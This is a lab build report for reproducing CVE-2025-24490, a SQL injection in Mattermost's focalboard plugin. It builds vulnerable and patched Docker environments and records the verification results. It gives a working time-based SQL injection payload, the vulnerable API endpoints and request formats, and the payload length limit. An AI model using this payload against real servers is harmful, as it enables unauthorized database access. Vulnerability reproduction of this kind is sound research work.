# Lab Build Report: CVE-2025-24490

## Lab Architecture

Multi-container Docker lab using official Mattermost Docker images with PostgreSQL backend. Two parallel environments:

1. **Vulnerable Environment** — Mattermost Enterprise Edition 9.11.7 with focalboard plugin v8.0.0 (contains unparameterized SQL CASE WHEN expressions)
2. **Patched Environment** — Mattermost Enterprise Edition 9.11.8 with focalboard plugin v9.0.5 (parameterized queries + server-side ID generation)

Each environment consists of:
- **PostgreSQL 15** — Backend database
- **Mattermost Server** — Application server with prepackaged focalboard plugin

### Architecture Decision: Multi-Container

Mattermost connects to PostgreSQL via configurable `MM_SQLSETTINGS_DATASOURCE` host:port — standard multi-container architecture with Docker Compose networking.

## Container Details

### Vulnerable Environment

| Container | Image | Role | Networks | Port |
|-----------|-------|------|----------|------|
| `cve-2025-24490-db` | `postgres:15` | PostgreSQL database | lab-net | 5432 (internal) |
| `cve-2025-24490-mattermost` | `mattermost/mattermost-enterprise-edition:9.11.7` | Mattermost + focalboard v8.0.0 | lab-net | 8065 |

### Patched Environment

| Container | Image | Role | Networks | Port |
|-----------|-------|------|----------|------|
| `cve-2025-24490-db-patched` | `postgres:15` | PostgreSQL database | lab-net-patched | 5432 (internal) |
| `cve-2025-24490-mattermost-patched` | `mattermost/mattermost-enterprise-edition:9.11.8` | Mattermost + focalboard v9.0.5 | lab-net-patched | 8065 |

### Network Layout

- **lab-net** — Internal communication for vulnerable environment (mattermost ↔ postgres)
- **lab-net-patched** — Internal communication for patched environment (mattermost ↔ postgres)

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| PostgreSQL (vulnerable) | ✅ Healthy | Official image, no build required |
| Mattermost 9.11.7 (vulnerable) | ✅ Healthy | Official image, no build required |
| Focalboard v8.0.0 plugin | ✅ Active | Installed from prepackaged_plugins via API |
| PostgreSQL (patched) | ✅ Healthy | Official image, no build required |
| Mattermost 9.11.8 (patched) | ✅ Healthy | Official image, no build required |
| Focalboard v9.0.5 plugin | ✅ Active | Installed from prepackaged_plugins via API |

### Setup Process

The focalboard plugin is **prepackaged but NOT auto-installed** in Mattermost 9.11.x. The setup script (`setup_mattermost.sh`) performs:
1. Waits for Mattermost health endpoint to return OK
2. Creates admin user (first user becomes system admin)
3. Logs in and obtains auth token
4. Creates `testteam` team
5. Uploads focalboard plugin from `/mattermost/prepackaged_plugins/focalboard-v8.0.0-linux-amd64.tar.gz` via `POST /api/v4/plugins`
6. Enables focalboard plugin via `POST /api/v4/plugins/focalboard/enable`
7. Verifies boards API is accessible

## Start/Stop Commands

### Vulnerable Environment
```bash
# Start
docker compose up -d

# Setup (run once after first start)
bash setup_mattermost.sh http://localhost:8065

# Stop
docker compose down

# Stop and reset data
docker compose down -v
```

### Patched Environment
```bash
# Start
docker compose -f docker-compose-patched.yml up -d

# Setup (run once after first start)
bash setup_mattermost_patched.sh http://localhost:8066

# Stop
docker compose -f docker-compose-patched.yml down
```

## Credentials

| Field | Value |
|-------|-------|
| Admin Username | `admin` |
| Admin Password | `Admin123!@#` |
| Admin Email | `admin@test.local` |
| Team Name | `testteam` |
| DB User | `mmuser` |
| DB Password | `mmuser_password` |
| DB Name | `mattermost` |

### Vulnerable Instance

| Field | Value |
|-------|-------|
| Mattermost URL | `http://localhost:8065` |
| Focalboard Version | `8.0.0` (vulnerable) |

### Patched Instance

| Field | Value |
|-------|-------|
| Mattermost URL | `http://localhost:8066` |
| Focalboard Version | `9.0.5` (patched) |

## Verification Evidence

### SQL Injection Confirmed on Vulnerable (9.11.7 / focalboard v8.0.0)

**Test**: Created a category with ID `'||(SELECT '' FROM pg_sleep(3))||'`, then triggered reorder.

| Test | HTTP Status | Response Time | Result |
|------|-------------|---------------|--------|
| Reorder with pg_sleep(3) payload | 200 | **3.01s** | ✅ SQL injection confirmed (3s delay) |
| Control reorder (normal IDs only) | 200 | 0.00s | ✅ Normal speed (no injection) |

**Details**:
1. `POST /plugins/focalboard/api/v2/teams/{teamID}/categories` with `"id": "'||(SELECT '' FROM pg_sleep(3))||'"` → HTTP 200 (malicious ID accepted and stored)
2. `GET /plugins/focalboard/api/v2/teams/{teamID}/categories` → Returns all category IDs including the injected one
3. `PUT /plugins/focalboard/api/v2/teams/{teamID}/categories/reorder` with all IDs → HTTP 200 after **3.01s** (pg_sleep(3) executed in database)

### Patched Version Correctly Defends (9.11.8 / focalboard v9.0.5)

**Test**: Same payload attempted on patched instance.

| Test | HTTP Status | Response Time | Result |
|------|-------------|---------------|--------|
| Create category with SQLi ID | 200 | instant | Server-side ID generation overwrites payload |
| Reorder after create | 200 | **0.00s** | ✅ No injection (parameterized queries) |

**Details**:
1. `POST /plugins/focalboard/api/v2/teams/{teamID}/categories` with `"id": "'||(SELECT '' FROM pg_sleep(3))||'"` → HTTP 200 but returned ID is `7ac5w4opkbifxdgsbdzbx8x7jea` (server-generated, payload overwritten by `PreCreate()`)
2. Reorder completes in 0.00s — even if a malicious ID were somehow stored, parameterized queries (`sq.Expr("?", categoryID)`) prevent injection

## Vulnerable Endpoints

### Primary — Category Reorder
```
PUT /plugins/focalboard/api/v2/teams/{teamID}/categories/reorder
Content-Type: application/json
Authorization: Bearer {token}
X-Requested-With: XMLHttpRequest

["<category_id_1>", "<sqli_payload>", "<category_id_2>"]
```

### Secondary — Category Boards Reorder
```
PUT /plugins/focalboard/api/v2/teams/{teamID}/categories/{categoryID}/boards/reorder
Content-Type: application/json
Authorization: Bearer {token}
X-Requested-With: XMLHttpRequest

["<board_id_or_sqli_payload>"]
```

## Lab Files

| File | Purpose |
|------|---------|
| `docker-compose.yml` | Vulnerable environment (MM 9.11.7 + PostgreSQL) |
| `docker-compose-patched.yml` | Patched environment (MM 9.11.8 + PostgreSQL) |
| `setup_mattermost.sh` | Setup script for vulnerable instance |
| `setup_mattermost_patched.sh` | Setup script for patched instance |

## Known Issues / Notes

1. **Auth tokens expire**: If tokens stop working, re-login via `POST /api/v4/users/login`.
2. **Plugin installation**: The focalboard plugin must be manually uploaded and enabled via API after each fresh Mattermost start (setup script handles this).
3. **VARCHAR(36) constraint**: SQL injection payloads in category IDs must be ≤ 36 characters due to the database column constraint.
4. **Category cleanup**: After testing, injected categories can be cleaned from the database directly: `docker exec cve-2025-24490-db psql -U mmuser -d mattermost -c "DELETE FROM focalboard_categories WHERE id LIKE '%||%';"`
